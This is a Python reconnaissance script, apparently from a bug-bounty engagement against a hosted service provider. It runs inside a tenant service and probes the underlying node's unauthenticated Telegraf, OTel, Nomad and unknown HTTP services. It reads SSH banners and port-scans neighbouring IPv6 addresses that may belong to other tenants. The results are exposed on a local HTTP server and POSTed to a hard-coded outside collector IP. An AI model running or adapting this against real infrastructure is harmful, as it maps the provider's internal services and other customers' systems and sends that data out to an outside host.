#!/usr/bin/env python3
"""probe12 - identify the two unauthenticated node services, and look for the target's sister addresses.

probe11 found on the node gateway: Telegraf (9955) answering 200 without auth, an OTel collector health
endpoint (13133), an unidentified Go-style HTTP server on 21543, sshd on 22/4222, Nomad 4646 (ACL'd).

Two questions: what is 21543, and do the target service's internal addresses have neighbours in the same
/112 (a "sister" service/node address) that expose the same agent ports? Identification only: GETs on
benign paths, a banner read, and one harmless Nomad regions query. No writes, no auth attempts.
"""
from __future__ import annotations

import json
import os
import socket
import ssl
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer

COLLECTOR = "http://208.87.134.252:9200/rt12"
UA = "aiven-bugbounty/1.0 (Bugcrowd-zllr; researcher: zllr)"
NODE = "169.254.1.2"
# the in-scope service's own ULA ends ...:5e9:cd8f:2191 - try its immediate neighbours in the same /112
NEIGHBOURS = ["fda7:a938:5bfe:5fa6:0:5e9:cd8f:%d" % n for n in (0, 1, 2, 3, 2189, 2190, 2192, 2193)]
AGENT_PORTS = [22, 5432, 9955, 4646, 13133, 21543]
RESULTS = {"stage": "init", "node_services": {}, "neighbours": {}, "nomad": {}, "notes": []}


class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(RESULTS, indent=1).encode())

    def log_message(self, *a):
        pass


def http_get(host, port, path, timeout=6, tls=False):
    fam = socket.AF_INET6 if ":" in host else socket.AF_INET
    try:
        s = socket.socket(fam, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        if tls:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=host)
        s.sendall(("GET %s HTTP/1.0\r\nHost: %s\r\nUser-Agent: %s\r\nX-Security-Testing: @zllr\r\n\r\n"
                   % (path, host, UA)).encode())
        d = b""
        while len(d) < 900:
            try:
                c = s.recv(400)
            except socket.timeout:
                break
            if not c:
                break
            d += c
        s.close()
        return d.decode("latin1", "replace")
    except Exception as e:                                              # noqa: BLE001
        return "ERR %s: %s" % (type(e).__name__, str(e)[:60])


def banner(host, port, timeout=4):
    fam = socket.AF_INET6 if ":" in host else socket.AF_INET
    try:
        s = socket.socket(fam, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        d = s.recv(200)
        s.close()
        return "%r" % d
    except Exception as e:                                              # noqa: BLE001
        return "ERR %s" % type(e).__name__


def tcp(host, port, timeout=2):
    fam = socket.AF_INET6 if ":" in host else socket.AF_INET
    s = socket.socket(fam, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((host, port))
        return "open"
    except socket.timeout:
        return "timeout"
    except OSError as e:
        return type(e).__name__
    finally:
        try:
            s.close()
        except Exception:                                               # noqa: BLE001
            pass


threading.Thread(target=lambda: HTTPServer(("0.0.0.0", int(os.environ.get("PORT", "8080"))), H).serve_forever(),
                 daemon=True).start()
time.sleep(2)

# 1. identify 21543 (unknown Go-ish 404) and confirm 9955 / 13133 behaviour. GETs only.
for port in (21543, 9955, 13133):
    for path in ("/", "/health", "/healthz", "/ready", "/metrics", "/version", "/api", "/debug/pprof/"):
        k = "%d%s" % (port, path)
        RESULTS["node_services"][k] = http_get(NODE, port, path)[:400]

# 2. what really answers on 4222
RESULTS["node_services"]["4222-banner"] = banner(NODE, 4222)
RESULTS["node_services"]["22-banner"] = banner(NODE, 22)

# 3. Nomad: one harmless cluster-metadata endpoint (regions) - no tenant data.
RESULTS["nomad"]["regions"] = http_get(NODE, 4646, "/v1/regions", tls=True)[:300]

# 4. sister addresses in the target's own /112: do the agent ports exist next door?
for addr in NEIGHBOURS:
    for port in AGENT_PORTS:
        st = tcp(addr, port)
        if st == "open":
            RESULTS["neighbours"]["%s:%d" % (addr, port)] = {"state": st,
                                                             "ident": http_get(addr, port, "/")[:200]}
        elif st not in ("timeout", "ConnectionRefusedError"):
            RESULTS["neighbours"]["%s:%d" % (addr, port)] = {"state": st}

RESULTS["stage"] = "done"
RESULTS["finished"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
body = json.dumps(RESULTS)
try:
    import urllib.request
    urllib.request.urlopen(urllib.request.Request(COLLECTOR, data=body.encode(),
                                                  headers={"Content-Type": "application/json"}), timeout=25)
except Exception as e:                                                  # noqa: BLE001
    print("collector post failed:", e)
print(json.dumps(RESULTS)[:3000])
while True:
    time.sleep(60)
